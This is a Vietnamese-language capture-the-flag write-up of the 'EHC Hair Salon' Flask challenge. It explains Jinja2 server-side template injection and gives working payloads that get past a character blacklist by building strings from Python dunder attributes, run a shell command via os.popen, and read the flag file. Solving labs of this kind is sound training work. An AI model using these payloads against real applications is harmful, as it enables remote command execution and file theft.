# EHC Hair Salon 
> IP: [Tommy Xiaomi](http://103.245.249.76:49168/).

> Đây là một bài cực khó đối với mình vì tất cả kiến thức là hoàn toàn mới, nhưng bằng một cách may mắn, mình đã vượt qua. 

# Source code and analysis

## Source
Bắt đầu vào bài có 1 link hiện ra trang web và 1 link tải [source code](https://github.com/M4rv3l-M3tavers3/FPTUHACKINGCTF2022-/blob/main/Web/EHC%20Hair%20Salon/app.py) Flask của web

![image](https://user-images.githubusercontent.com/93731698/176366025-f781f9bb-ec6f-4da2-a1fe-e88c364f256f.png)




## Analysis
- Dễ dàng nhận ra có `render_template_string()` nên đoán đây là [SSTI](https://portswigger.net/research/server-side-template-injection).
```python 
  page = \
            '''
        {{% extends "layout.html" %}}
        {{% block body %}}
        <center>
           <section class="section">
              <div class="container">
                 <h1 class="title">Dậy đi ông cháu ơi, cắt xong rồi nhé!</h1>
                 <ul class=flashes>
                    <label>Ông cháu có quả đầu {} thanh toán tiền cho chú nào <3</label>
                 </ul>
                 </br>
              </div>
           </section>
           <iframe width="560" height="315" src="https://v16m-webapp.tiktokcdn-us.com/2f678d478e2de26a048aaf4f3ed6d8bd/62b6f7f3/video/tos/useast2a/tos-useast2a-pve-0037-aiso/dd6e434a38e4447e83f61a684c31583b/?a=1988&ch=0&cr=0&dr=0&lr=tiktok&cd=0%7C0%7C0%7C0&br=1302&bt=651&cs=0&ds=1&ft=ebtHKHk_Myq8Z4IeUwe2NsE~fl7Gb&mime_type=video_mp4&qs=0&rc=ZThoZWk7Zzw3PGQ1NmVnM0BpM3VsZWg6ZjhzZDMzZjgzM0AzLjIyYC8tX2AxYGFhMjVhYSNnMS9kcjQwMC1gLS1kL2Nzcw%3D%3D&l=202206250556040100040040250040050060030180F0D3C2C" frameborder="0" allowfullscreen></iframe>
      </iframe>
        </center>
        {{% endblock %}}
        '''.format(hair_type)

    elif request.method == 'GET':
        page = \
            '''
        {% extends "layout.html" %}
        {% block body %}
        <center>
            <section class="section">
              <div class="container">
                 <h1 class="title">Chào mừng đến với <a href="https://www.facebook.com/ehc.fptu">EHC Hair Salon</a>, hôm nay ông cháu này muốn cắt quả đầu nào nhể?</h1>
                 <p>Nhập tên quả đầu mà ông cháu muốn cắt nha!</p>
                 <form action='/' method='POST' align='center'>
                    <p><input name='hair' style='text-align: center;' type='text' placeholder='Tommy Xiaomi' /></p>
                    <p><input value='Submit' style='text-align: center;' type='submit' /></p>
                 </form>
              </div>
           </section>
        </center>
        {% endblock %}
        '''
    return render_template_string(page)
```
- Nhưng vì đã bị chặn khá nhiều filter đặc biệt là string và number nên chắc phải inject từ một input nào đó.
```python
regex = "request|config|self|class|flag|0|1|2|3|4|5|6|7|8|9|\"|\'|\\|\~|\%|\#"

error_page = '''
        {% extends "layout.html" %}
        {% block body %}
        <center>
           <section class="section">
              <div class="container">
                 <h1 class="title">Ông cháu à!</h1>
                 <p>Ông chú chỉ cắt được quả đầu Tommy Xiaomi thôi!</p>
              </div>
           </section>
        </center>
        {% endblock %}
        '''
 ```
- Vì bình thường có thể inject code python vào đây ví dụ như `{{7*7}}` sẽ render ra 49. Nhưng giờ thay vì nhập string và number trực tiếp, mình có thể dùng những thứ có sẵn của python đó là khi mình tìm được ra [Magic_or_Dunder_Method](https://www.tutorialsteacher.com/python/magic-methods-in-python#:~:text=Magic%20methods%20in%20Python%20are,class%20on%20a%20certain%20action).
- Và mình cũng nhận ra bài này có những kiến thức khá mới như `Server-side template injection with Jinja2`.
* Hiểu thêm về [Jinja](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2)

## Exploit

Chúng ta sẽ dùng những thứ có sẵn trong python(`Python Magic Methods`), Ex: 

 - `().__doc__` trả về doc của tuple "Built-in immutable sequence.\n\nIf no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the   tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object."
- `().__gt__.__name__` trả về "__gt__"
- `[].__len__()` trả về số phần tử của mảng rỗng là 0
- `[[]].__len__()` trả về 1

- Mình mò và thử inject payload kết hợp các syntax trên cùng với [os.popen().read()]((https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread) `{{cycler.__init__.__globals__.os.popen(().__doc__[[[],[],[]].__len__()]+().__str__.__name__[[[],[]].__len__()]).read()}}` thì bất ngờ tìm được một file có tên flag. 
![image](https://user-images.githubusercontent.com/93731698/176378969-5ab1a918-1531-439e-8554-6b3606e48724.png)

Tương tự đoạn code trên, mình viết 1 đoạn đoạn code trả về chữ `flag`
```cs
[].__doc__[-[].clear.__name__.__len__()]+\
[].__doc__[[].pop.__name__.__len__()]+\
().__doc__[-[].__getitem__.__name__.__len__()]+\
{}.__new__.__doc__[-[].__init__.__name__.__len__()]
```
- Cuối cùng mình dùng [read remote file] (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinja2---read-remote-file) có inject với payload: `{{a.__init__.__globals__.__builtins__.open([].__doc__[-[].clear.__name__.__len__()]+[].__doc__[[].pop.__name__.__len__()]+().__doc__[-[].__getitem__.__name__.__len__()]+{}.__new__.__doc__[-[].__init__.__name__.__len__()]).read()}}`

Wait a minutes...

![image](https://user-images.githubusercontent.com/93731698/176383050-e709c9b5-1888-4c4c-ae5c-557f2f386787.png)

## Flag: `FPTUHacking{d4y_d1_0ng_ch4u_0i,ban_da_thoat_khoi_EHC_hair_salon_roi}`

